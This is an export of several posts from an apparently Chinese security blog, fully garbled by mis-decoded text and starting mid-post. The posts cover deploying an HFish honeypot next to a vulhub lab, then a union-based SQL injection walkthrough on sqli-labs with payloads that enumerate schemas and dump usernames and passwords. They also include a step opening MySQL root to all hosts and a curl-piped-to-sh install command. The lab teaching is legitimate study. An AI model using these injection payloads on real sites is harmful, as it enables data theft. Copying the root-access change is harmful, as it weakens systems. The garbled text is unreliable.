å¯èƒ½æ˜¯ç”±äºvulhubé¶åœºçš„åŸå› ï¼Œdockerçš„éƒ¨ç½²ä¸æ˜¯å¾ˆé¡ºåˆ©ï¼Œä¸æ”¯æŒsystemctlï¼Œserviceä¹Ÿä¼šæŠ¥é”™ï¼Œæ‰€ä»¥è¿™é‡Œæš‚æ—¶æ²¡æœ‰æ‰¾åˆ°å¥½çš„æ–¹æ³•ï¼Œåªæä¾›ä¸€ç§æ€è·¯ã€‚ å¯å‚è€ƒä¹‹å‰èœœç½éƒ¨ç½²çš„blog [hfishèœœç½éƒ¨ç½²docker]ï¼ˆhttps://gryffinbit.top/2022/02/24/hfish%E8%9C%9C%E7%BD%90%E9%83%A8%E7%BD%B2/ï¼‰ è¿›å…¥dockeré¶åœºçš„bash ä¸ºè¯¥dockeré¶åœºï¼Œå®‰è£…docker https://yeasy.gitbook.io/docker_practice/install/debian æŸ¥çœ‹é¶åœºç³»ç»Ÿä¿¡æ¯ 1cat /etc/issue å‘ç°æ˜¯Debainï¼Œæ ¹æ®dockerçš„å®˜æ–¹ä¸‹è½½ï¼Œå®‰è£…docker å®‰è£…sudoå‘½ä»¤ su //è¿›å…¥rootæƒé™ apt-get update apt-get install sudo 1234567 ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/202203200011273.png)* æŠŠrootæ·»åŠ åˆ°sudoç»„ ```shell adduser root sudo å¸è½½æ—§ç‰ˆæœ¬ æ—§ç‰ˆæœ¬çš„ Docker ç§°ä¸º docker æˆ–è€… docker-engineï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¸è½½æ—§ç‰ˆæœ¬ï¼š 123sudo apt-get remove dockersudo apt-get remove docker-enginesudo apt-get remove docker.io ä½¿ç”¨ APT å®‰è£… ç”±äº apt æºä½¿ç”¨ HTTPS ä»¥ç¡®ä¿è½¯ä»¶ä¸‹è½½è¿‡ç¨‹ä¸­ä¸è¢«ç¯¡æ”¹ã€‚å› æ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ·»åŠ ä½¿ç”¨ HTTPS ä¼ è¾“çš„è½¯ä»¶åŒ…ä»¥åŠ CA è¯ä¹¦ã€‚ 1234567sudo apt-get updatesudo apt-get install apt-transport-httpssudo apt-get install ca-certificatessudo apt-get install curlsudo apt-get install gnupgsudo apt-get install lsb-release debianæ›´æ¢æº ä¸ºäº†ç¡®è®¤æ‰€ä¸‹è½½è½¯ä»¶åŒ…çš„åˆæ³•æ€§ï¼Œéœ€è¦æ·»åŠ è½¯ä»¶æºçš„ GPG å¯†é’¥ã€‚ 12# é˜¿é‡Œæºcurl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg å‘ sources.list ä¸­æ·»åŠ  Docker è½¯ä»¶æºï¼š åœ¨ä¸€äº›åŸºäº Debian çš„ Linux å‘è¡Œç‰ˆä¸­ $(lsb_release -cs) å¯èƒ½ä¸ä¼šè¿”å› Debian çš„ç‰ˆæœ¬ä»£å·ï¼Œä¾‹å¦‚ Kail Linuxã€ BunsenLabs Linuxã€‚åœ¨è¿™äº›å‘è¡Œç‰ˆä¸­æˆ‘ä»¬éœ€è¦å°†ä¸‹é¢å‘½ä»¤ä¸­çš„ $(lsb_release -cs) æ›¿æ¢ä¸º https://mirrors.aliyun.com/docker-ce/linux/debian/dists/ ä¸­æ”¯æŒçš„ Debian ç‰ˆæœ¬ä»£å·ï¼Œä¾‹å¦‚ busterã€‚ 1echo &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/debian buster stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null ä»¥ä¸Šå‘½ä»¤ä¼šæ·»åŠ ç¨³å®šç‰ˆæœ¬çš„ Docker APT æºï¼Œå¦‚æœéœ€è¦æµ‹è¯•ç‰ˆæœ¬çš„ Docker è¯·å°† stable æ”¹ä¸º testã€‚ å®‰è£…docker æ›´æ–° apt è½¯ä»¶åŒ…ç¼“å­˜ï¼Œå¹¶å®‰è£… docker-ceã€‚ 12345sudo apt-get updatesudo apt-get install docker-ce sudo apt-get install docker-ce-clisudo apt-get install containerd.io ä½¿ç”¨è„šæœ¬è‡ªåŠ¨å®‰è£… 12curl -fsSL get.docker.com -o get-docker.shsudo sh get-docker.sh --mirror Aliyun æ‰§è¡Œè¿™ä¸ªå‘½ä»¤åï¼Œè„šæœ¬å°±ä¼šè‡ªåŠ¨çš„å°†ä¸€åˆ‡å‡†å¤‡å·¥ä½œåšå¥½ï¼Œå¹¶ä¸”æŠŠ Docker çš„ç¨³å®š(stable)ç‰ˆæœ¬å®‰è£…åœ¨ç³»ç»Ÿä¸­ã€‚ å¯åŠ¨docker 12sudo systemctl enable dockersudo systemctl start docker é…ç½®docker é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker å‘½ä»¤ä¼šä½¿ç”¨ Unix socket ä¸ Docker å¼•æ“é€šè®¯ã€‚è€Œåªæœ‰ root ç”¨æˆ·å’Œ docker ç»„çš„ç”¨æˆ·æ‰å¯ä»¥è®¿é—® Docker å¼•æ“çš„ Unix socketã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œä¸€èˆ¬ Linux ç³»ç»Ÿä¸Šä¸ä¼šç›´æ¥ä½¿ç”¨ root ç”¨æˆ·ã€‚å› æ­¤ï¼Œæ›´å¥½åœ°åšæ³•æ˜¯å°†éœ€è¦ä½¿ç”¨ docker çš„ç”¨æˆ·åŠ å…¥ docker ç”¨æˆ·ç»„ã€‚ å»ºç«‹ docker ç»„ï¼š 1sudo groupadd docker å°†å½“å‰ç”¨æˆ·åŠ å…¥ docker ç»„ï¼š 1sudo usermod -aG docker $USER æµ‹è¯• Docker æ˜¯å¦å®‰è£…æ­£ç¡® çœ‹æ˜¯å¦èƒ½æ­£ç¡®è¾“å‡º 1docker run --rm hello-world ä¸ºé¶åœºéƒ¨ç½²èœœç½ ä¹‹å‰çš„æ€è·¯æ˜¯ç”¨vulhubçš„ç°æˆdockeré¶åœºï¼Œåœ¨dockeré‡Œé¢å®‰è£…dockerï¼Œç„¶åå†ç”¨è¿™ä¸ªdockerå»pullä¸€ä¸ªç°æˆçš„ç‹¬ç«‹èœœç½ï¼Œä½†æ˜¯è¿™æ ·ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸”dockeréƒ¨ç½²æœ‰é—®é¢˜ï¼Œæ‰€ä»¥åæ¥å°±æ”¹å˜äº†å¦å¤–ä¸€ç§æ–¹å¼ã€‚ç”¨ç‰©ç†æœºä¸Šçš„dockerå»æ­å»ºäº†ä¸€ä¸ªèœœç½ï¼Œä½œä¸ºç®¡ç†ç«¯ï¼Œç„¶åæŠŠé¶åœºdockerä½œä¸ºè¿™ä¸ªèœœç½çš„å­èŠ‚ç‚¹ã€‚ HFishèœœç½éƒ¨ç½²ï¼Œå‚è€ƒä»¥å‰çš„blog HFishèœœç½éƒ¨ç½² æŸ¥çœ‹é¶åœºéƒ¨ç½²æƒ…å†µ è®¿é—®dockeré¶åœº æ‰¾åˆ°å®¹å™¨å†…çš„å¯¹è±¡çš„ID 1docker ps å°†dockerçš„8080ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„8081ç«¯å£ï¼Œå»è®¿é—® 1http://127.0.0.1:8081/ æŸ¥è¯¢å®¹å™¨å†…ç³»ç»Ÿçš„IP 1docker inspect [å¯¹è±¡ID] ä¸ç‰©ç†æœºåŒä¸€ç½‘æ®µä¸‹ï¼Œå‡å¯è®¿é—®åˆ°dokcer åœ¨èœœç½ç®¡ç†ç«¯æ·»åŠ èŠ‚ç‚¹ æ·»åŠ èŠ‚ç‚¹ï¼ŒæŠŠé¶åœºè®¿é—®åœ°å€å¡«å…¥ 1http://192.168.0.71:8081/ è¿›å…¥é¶åœºbashï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œéƒ¨ç½²èœœç½ 1sh -c &quot;$(curl -k http://192.168.0.71:8081//tmp/yW1SuCpRbGl0.sh)&quot; å‚è€ƒæ–‡ç« docker in dockerä¸€ä¸ªå¥½ç©çš„ä¸œè¥¿ï¼Œdocker in dockerï¼Œå› ä¸ºè¿™ä¸ªBlogçš„æ€è·¯å°±æ˜¯ç”¨dockerè£…é¶åœºï¼Œåœ¨é¶åœºé‡Œé¢åœ¨è£…ä¸€ä¸ªdockeræ¥å®ç°èœœç½çš„åŠŸèƒ½ï¼Œdocker in dockerçš„å¥—å¨ƒç©æ„ï¼Œå¯ä»¥ç©ç©ã€‚ğŸ¤ª å®˜æ–¹dindã€docker in dockerã€‘é•œåƒ dockerä»å…¥é—¨åˆ°å®è·µ Hfishèœœç½éƒ¨ç½²","categories":[{"name":"æ”»é˜²æ¨¡æ‹Ÿ","slug":"æ”»é˜²æ¨¡æ‹Ÿ","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/"},{"name":"è“é˜Ÿ","slug":"æ”»é˜²æ¨¡æ‹Ÿ/è“é˜Ÿ","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/%E8%93%9D%E9%98%9F/"}],"tags":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://gryffinbit.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"å…¥ä¾µæ’æŸ¥","slug":"å…¥ä¾µæ’æŸ¥","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/tags/Linux/"}],"author":"Gryffinbit"},{"title":"Hfishèœœç½éƒ¨ç½²","slug":"Hfishèœœç½éƒ¨ç½²","date":"2022-02-24T19:34:49.000Z","updated":"2024-11-12T06:59:40.000Z","comments":true,"path":"2022/02/25/Hfishèœœç½éƒ¨ç½²/","permalink":"https://gryffinbit.top/2022/02/25/Hfish%E8%9C%9C%E7%BD%90%E9%83%A8%E7%BD%B2/","excerpt":"","text":"Hfish Dockerèœœç½éƒ¨ç½²å®‰è£…å‡†å¤‡å®éªŒç¯å¢ƒï¼šç‰©ç†æœº Apple M1èŠ¯ç‰‡ï¼Œ2020. macOS Monterey Dockerç‰ˆæœ¬ï¼š Hfishçš„ä»‹ç»GitHubé¡¹ç›®ï¼šhttps://github.com/hacklcx/HFish é¡¹ç›®ä»‹ç»çš„å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘å°±ä¸èµ˜è¿°äº† Hfishçš„éƒ¨ç½²Dockerçš„å®‰è£…æ­¥éª¤å¯ä»¥å‚è€ƒä¹‹å‰çš„blogï¼šsqlé¶åœºæ­å»º è·å–é•œåƒ 1docker pull imdevops/hfish å®¹å™¨éƒ¨ç½² 1docker run -d --name hfish -p 21:21 -p 22:22 -p 23:23 -p 69:69 -p 3306:3306 -p 5900:5900 -p 6379:6379 -p 8080:8080 -p 8081:8081 -p 8989:8989 -p 9000:9000 -p 9001:9001 -p 9200:9200 -p 11211:11211 --restart=always imdevops/hfish:latest åœ¨ç‰©ç†æœºè®¿é—® 1http://[æœ¬æœºIP]:9001 åˆå§‹è´¦æˆ·å¯†ç ï¼š admin admin ä¿®æ”¹é…ç½®æ–‡ä»¶ 1docker exec -it [å®¹å™¨å] sh ä¿®æ”¹ç®¡ç†å‘˜è´¦æˆ·å¯†ç  1vi HFish/config.ini åšä¸ªæµ‹è¯•ï¼Œç”¨kaliå»nmapæ‰«ææœ¬æœºï¼ŒæŸ¥çœ‹ä¼šä¸ä¼šæœ‰èœœç½é‚£è¾¹çš„å‘Šè­¦ èœœç½æ­å»ºæˆåŠŸ æœ€æ–°ç‰ˆæœ¬å®‰è£… 2.8.0 å®˜æ–¹å®‰è£…æ–‡æ¡£ï¼šhttps://hfish.io/#/2-1-docker?id=docker%e5%ae%89%e8%a3%85%e8%af%b4%e6%98%8e æ­¥éª¤1ï¼šç¡®è®¤å·²å®‰è£…å¹¶å¯åŠ¨Docker 1docker version æ­¥éª¤2ï¼šæ‹‰å–æœ€æ–°ç‰ˆæœ¬çš„é•œåƒ 1docker pull threatbook/hfish-server:latest æ­¥éª¤3:ç«¯å£æ˜ å°„ã€å®¹å™¨éƒ¨ç½² 12345docker run -d -p 22:22 -p 9090:9090 -p 6379:6379 -p 135:135 -p 139:139 -p 3389:3389 -p 4433:4433 -p 9093:9093 -p 9194:9194 -p 9099:9099 -p 23:23 -p 3307:3307 --name hfish -v /usr/share/hfish:/usr/share/hfish --restart=always --privileged=true threatbook/hfish-server:latestdocker run -d --name hfish -p 22:22 -p 9090:9090 -p 6379:6379 -p 135:135 -p 139:139 -p 3389:3389 -p 4433:4433 -p 9093:9093 -p 9194:9194 -p 9099:9099 -p 23:23 -p 3307:3307 -v /usr/share/hfish:/usr/share/hfish --restart=always --privileged=true threatbook/hfish-server:latest ã€æ•°æ®æŒä¹…åŒ–ï¼šåœ¨å®¿ä¸»æœº&#x2F;usr&#x2F;share&#x2F;hfishç›®å½•ä¸‹å»ºç«‹dataç›®å½•ç”¨äºå­˜æ”¾æ”»å‡»æ•°æ®ï¼Œå»ºç«‹logsç›®å½•ç”¨äºå­˜æ”¾æ—¥å¿—ã€‚ã€‘ æ­¥éª¤4ï¼šé…ç½®åç»­è‡ªåŠ¨å‡çº§ï¼ˆæ¡†å†…å…¨éƒ¨å¤åˆ¶ï¼Œç²˜è´´ï¼Œæ‰§è¡Œå³å¯ï¼‰ 12345678910docker run -d \\ --name watchtower \\ --restart unless-stopped \\ -v /var/run/docker.sock:/var/run/docker.sock \\ --label=com.centurylinklabs.watchtower.enable=false \\--privileged=true \\ containrrr/watchtower \\ --cleanup \\ hfish \\ --interval 3600 ã€è‡ªåŠ¨å‡çº§ï¼šæ¯å°æ—¶è¯·æ±‚æœ€æ–°é•œåƒè¿›è¡Œå‡çº§ï¼Œå‡çº§ä¸ä¼šä¸¢å¤±æ•°æ®ã€‚ã€‘ æ­¥éª¤5ï¼šç™»é™†HFish ç™»é™†åœ°å€ï¼šhttps://ip:4433/web/ åˆå§‹ç”¨æˆ·åï¼šadmin åˆå§‹å¯†ç ï¼šHFish2021 dockerçš„Hfishè¿æ¥æ•°æ®åº“ æˆ‘ä»¬å°†æ•°æ®åº“æ­å»ºåœ¨å®¿ä¸»æœºä¸­ï¼Œè€Œédockerä¸­ï¼Œè¿™æ ·ä¸ºäº†ä¿æŠ¤æ•°æ®å®‰å…¨ dokcerå®¹å™¨å†…è¿æ¥å®¿ä¸»æœºMysql macå®‰è£…mysql ç¤¾åŒºç‰ˆmysql-ARMæ¶æ„8.0.28 mysqlå®¢æˆ·ç«¯dbeaver ä¿®æ”¹é…ç½®æ–‡ä»¶ 1vim ~/.bash_profile åœ¨é…ç½®æ–‡ä»¶ä¸­è¾“å…¥ 1export PATH=$&#123;PATH&#125;:/usr/local/mysql/bin æ‰§è¡Œä¿®æ”¹åçš„æ–‡ä»¶ 1source .bash_profile è§£å†³macé‡æ–°å¯åŠ¨ç»ˆç«¯source .bash_profileå°±è¦è¾“å…¥æ‰§è¡Œä¸€ä¸‹.åœ¨ç»ˆç«¯è¾“å…¥ï¼švim ~/.zshrcåœ¨æ–‡ä»¶ä¸­è¾“å…¥: source ~/.bash_profile è¿™æ ·åœ¨é‡æ–°å¯åŠ¨ç»ˆç«¯mysqlå‘½ä»¤å°±å¯ä»¥ç›´æ¥æ‰§è¡Œã€‚ è®¾ç½®å®¿ä¸»æœºmysqlå…è®¸dockerçš„è™šæ‹Ÿç½‘å¡ipè®¿é—® åœ¨å®¿ä¸»æœºçš„ç»ˆç«¯åˆ›å»ºmysqlæ•°æ®åº“,å¹¶å…è®¸è¿œç¨‹è®¿é—® 123 mysql -uroot -p# åˆ›å»ºä¸€ä¸ªå«hfishçš„æ•°æ®åº“create database hfish; åœ¨mysqlå®¢æˆ·ç«¯ï¼Œè¿›ä¸€æ­¥åˆ›å»ºå¹¶è®¾è®¡æ•°æ®åº“ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263-- ------------------------------ Table structure for `hfish_info`-- ----------------------------DROP TABLE IF EXISTS `hfish_info`;CREATE TABLE `hfish_info` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `project_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `country` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `region` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `city` varchar(10) NOT NULL, `info` text NOT NULL, `create_time` datetime NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_colony`-- ----------------------------DROP TABLE IF EXISTS `hfish_colony`;CREATE TABLE `hfish_colony` ( `id` int(11) NOT NULL AUTO_INCREMENT, `agent_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent_ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `web_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `deep_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ssh_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `redis_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mysql_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `http_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `telnet_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ftp_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mem_cache_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `plug_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `last_update_time` datetime NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `un_agent` (`agent_name`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_setting`-- ----------------------------DROP TABLE IF EXISTS `hfish_setting`;CREATE TABLE `hfish_setting` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `info` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `update_time` datetime NOT NULL, `status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `setting_name` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `setting_dis` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, PRIMARY KEY (`id`), UNIQUE KEY `index_key` (`type`)) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of `hfish_setting`-- ----------------------------BEGIN;INSERT INTO `hfish_setting` VALUES (&#x27;1&#x27;, &#x27;mail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;E-mail ç¾¤å‘&#x27;, &#x27;ç¾¤å‘é‚®ä»¶SMTPæœåŠ¡å™¨é…ç½®&#x27;), (&#x27;2&#x27;, &#x27;alertMail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 18:58:12&#x27;, &#x27;0&#x27;, &#x27;E-mail é€šçŸ¥&#x27;, &#x27;èœœç½å‘Šè­¦ä¼šé€šè¿‡é‚®ä»¶å‘ŠçŸ¥ä¿¡æ¯&#x27;), (&#x27;3&#x27;, &#x27;webHook&#x27;, &#x27;&#x27;, &#x27;2019-09-03 11:49:00&#x27;, &#x27;0&#x27;, &#x27;WebHook é€šçŸ¥&#x27;, &#x27;èœœç½å‘Šè­¦ä¼šè¯·æ±‚æŒ‡å®šAPIå‘ŠçŸ¥ä¿¡æ¯&#x27;), (&#x27;4&#x27;, &#x27;whiteIp&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;IP ç™½åå•&#x27;, &#x27;èœœç½ä¸Šé’©ä¼šè¿‡æ»¤æ‰ç™½åå•IP&#x27;);COMMIT;SET FOREIGN_KEY_CHECKS = 1; ![Screen Shot 2022-03-08 at 4.45.33 PM](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-03-08 at 4.45.33 PM.png) ä¿®æ”¹å®¿ä¸»æœºmysqlé…ç½®ï¼Œå…è®¸å¤–éƒ¨è®¿é—® 1ï¼Œç™»è¿›MySQLä¹‹åï¼Œ 2ï¼Œè¾“å…¥ä»¥ä¸‹è¯­å¥ï¼Œè¿›å…¥mysqlåº“ï¼š 1use mysql 3ï¼Œæ›´æ–°åŸŸå±æ€§ï¼Œâ€™%â€™è¡¨ç¤ºå…è®¸å¤–éƒ¨è®¿é—®ï¼š 1update user set host=&#x27;%&#x27; where user =&#x27;root&#x27;; 4ï¼Œæ‰§è¡Œä»¥ä¸Šè¯­å¥ä¹‹åå†æ‰§è¡Œï¼š 1FLUSH PRIVILEGES; z Hfishè¿æ¥å®¿ä¸»æœºmysqlæ•°æ®åº“ è¿æ¥æˆåŠŸ å‚è€ƒæ–‡ç« èœœç½æ­å»ºè¸©å‘ docker composeå®˜æ–¹æ–‡æ¡£ docker composeèœé¸Ÿæ•™ç¨‹","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"èœœç½","slug":"å…¥ä¾µæ£€æµ‹/èœœç½","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E8%9C%9C%E7%BD%90/"}],"tags":[{"name":"èœœç½","slug":"èœœç½","permalink":"https://gryffinbit.top/tags/%E8%9C%9C%E7%BD%90/"},{"name":"Hfish","slug":"Hfish","permalink":"https://gryffinbit.top/tags/Hfish/"}],"author":"Gryffinbit"},{"title":"sqlè”åˆæŸ¥è¯¢æ³¨å…¥","slug":"sqlè”åˆæŸ¥è¯¢æ³¨å…¥","date":"2022-02-09T22:10:28.000Z","updated":"2024-11-12T06:59:18.000Z","comments":true,"path":"2022/02/10/sqlè”åˆæŸ¥è¯¢æ³¨å…¥/","permalink":"https://gryffinbit.top/2022/02/10/sql%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/","excerpt":"","text":"sqlè”åˆæŸ¥è¯¢æ³¨å…¥ sqlæ³¨å…¥çš„ç›¸å…³åŸºç¡€çŸ¥è¯†å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„BLOG è”åˆæŸ¥è¯¢çš„ä¸€ä¸ªæ€è·¯æ­¥éª¤ï¼š åˆ¤æ–­æ³¨å…¥ç‚¹ åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼ˆæ•°å­—å‹å‹orå­—ç¬¦å‹ï¼‰ åˆ¤æ–­å­—æ®µæ•° åˆ¤æ–­å›æ˜¾ä½ ç¡®å®šæ•°æ®åº“å ç¡®å®šè¡¨å ç¡®å®šå­—æ®µå æ‹¿åˆ°æ•°æ® ç”¨sqli-lab-less1ä¸¾ä¾‹ åˆ¤æ–­æ³¨å…¥ç‚¹ 12http://127.0.0.1:8888/Less-1/?id=1&#x27; //æŠ¥é”™é¡µé¢http://127.0.0.1:8888/Less-1/?id=1 //æ­£å¸¸é¡µé¢ æ‰€ä»¥å­˜åœ¨æ³¨å…¥ç‚¹ åˆ¤æ–­æ³¨å…¥ç‚¹ç±»å‹ ç”±äºæŠ¥é”™ä¿¡æ¯ï¼Œæ˜¾ç¤ºçš„æ˜¯å•å¼•å·é—­åˆé—®é¢˜,å¹¶ä¸”æŠ¥é”™ä¿¡æ¯æ˜¾ç¤ºäº†ä¼ å…¥çš„å‚æ•° è‹¥æ³¨é‡Šäº†å•å¼•å·åˆ™æ­£å¸¸æ˜¾ç¤ºã€‚æ‰€ä»¥åˆ¤æ–­æ˜¯å­—ç¬¦å‹æ³¨å…¥ åˆ¤æ–­å­—æ®µæ•° è¾“å…¥ 12?id=1&#x27; order by 3 //æ˜¾ç¤ºæ­£å¸¸?id=1&#x27; order by 4 //æŠ¥é”™ order by 3ä¹‹å‰éƒ½æ˜¾ç¤ºæ­£å¸¸ï¼Œç›´åˆ°4å¼€å§‹æŠ¥é”™ï¼Œå¯ä»¥åˆ¤æ–­å‡ºå­—æ®µæ•°æœ‰3åˆ— åˆ¤æ–­å›æ˜¾ä½ 1?id=-1&#x27; union select 1,2,3 --+ åˆ©ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥.åˆ¤æ–­å‡º2ï¼Œ3ä½ä¸ºæ˜¾ç¤ºä½ ç¡®å®šæ•°æ®åº“å åœ¨æ˜¾ç¤ºä½ï¼Œè¾“å…¥æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚ï¼ˆæ•°æ®åº“å¸¸ç”¨å‡½æ•°ä¸å‚æ•°ï¼‰ database() æŸ¥è¯¢æ•°æ®åº“å 1?id=-1&#x27; union select 1,2,database() --+ çˆ†å‡ºå…¨éƒ¨çš„åº“å 1?id=-1&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+ ç¡®å®šè¡¨å æŸ¥è¯¢çš„è¯­å¥ä¸º 1?id=-1&#x27; union select 1,database(),table_name from information_schema.tables where table_schema=&#x27;security&#x27; --+ çˆ†å‡ºæŸä¸ªæŒ‡å®šæ•°æ®åº“çš„å…¨éƒ¨è¡¨å 1?id=-1&#x27; union all select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&quot;security&quot;--+ ç¡®å®šå­—æ®µå 1?id=-1&#x27; union select 1,1,column_name from information_schema.columns where table_name=&#x27;emails&#x27; --+ çˆ†å‡ºæŒ‡å®šè¡¨çš„æ‰€æœ‰å­—æ®µ 1?id=-1&#x27; union all select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=&quot;security&quot; --+ æ‹¿åˆ°æŒ‡å®šå­—æ®µçš„æ•°æ® 1?id=-1&#x27; union all select 1, group_concat(username),group_concat(password) from users --+ æŒ‡å®šè¡¨ï¼Œæ‹¿åˆ°è¿™ä¸ªè¡¨é‡ŒæŸä¸ªå­—æ®µçš„æ•°æ®","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Webå®‰å…¨/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"sqlæ³¨å…¥çš„åŸºç¡€çŸ¥è¯†","slug":"sqlæ³¨å…¥çš„åŸºç¡€çŸ¥è¯†","date":"2022-02-07T23:35:42.000Z","updated":"2024-11-12T06:59:16.000Z","comments":true,"path":"2022/02/08/sqlæ³¨å…¥çš„åŸºç¡€çŸ¥è¯†/","permalink":"https://gryffinbit.top/2022/02/08/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"sqlæ³¨å…¥çš„åŸºç¡€çŸ¥è¯†ç›¸å…³çŸ¥è¯†information_schemaåº“ MYSQLåœ¨5.0ç‰ˆæœ¬åï¼Œé»˜è®¤ä¼šåœ¨æ•°æ®åº“ä¸­å­˜æ”¾ä¸€ä¸ªå«â€information_schemaâ€çš„æ•°æ®åº“ã€‚è¿™ä¸ªæ•°æ®åº“ä¿å­˜äº†MYSQLä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ï¼Œæ•°æ®åº“åã€æ•°æ®åº“çš„è¡¨åã€æ•°æ®åº“ä¸­çš„è¡¨çš„åˆ—åä»¥åŠè®¿é—®æƒé™ç­‰ã€‚ è¿™é‡Œéœ€è¦çŸ¥é“çš„è¡¨æœ‰ä¸‰ä¸ª: SCHEMATAã€TABLESå’ŒCOLUMNS å…¶ä¸­SCHEMATAè¡¨ä¸­çš„SCHEMA_NAMEè®°å½•äº†æ‰€æœ‰æ•°æ®åº“çš„åå­— TABLESè¡¨ä¸­çš„TABLE_SCHEMAå’ŒTABLE_NAMEä¸¤ä¸ªå­—æ®µåˆ†åˆ«è®°å½•äº†æ•°æ®åº“çš„åº“åå’Œè¡¨åã€‚ COLUMNSè¡¨ä¸­å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€è¡¨åå’Œå­—æ®µåï¼ŒTABLE_SCHEMAè®°å½•äº†åº“åã€TABLE_NAMEè®°å½•äº†è¡¨åã€COLUMN_NAMEè®°å½•äº†å­—æ®µåã€‚ MYSQLçš„æŸ¥è¯¢è¯­å¥ ä¸çŸ¥é“ä»»ä½•æ¡ä»¶æ—¶ 1select column_name from schema_name.table_name; å…¶ä¸­column_nameæ˜¯è¦æŸ¥è¯¢çš„å­—æ®µåï¼Œschema_nameæ˜¯åº“åï¼Œtable_nameæ˜¯è¡¨å çŸ¥é“ä¸€æ¡å·²çŸ¥æ¡ä»¶æ—¶ 1select column_name from schema_name.table_name where column_name1=â€™some_valueâ€™; å…¶ä¸­column_name1æ˜¯å·²çŸ¥æ¡ä»¶çš„å­—æ®µå 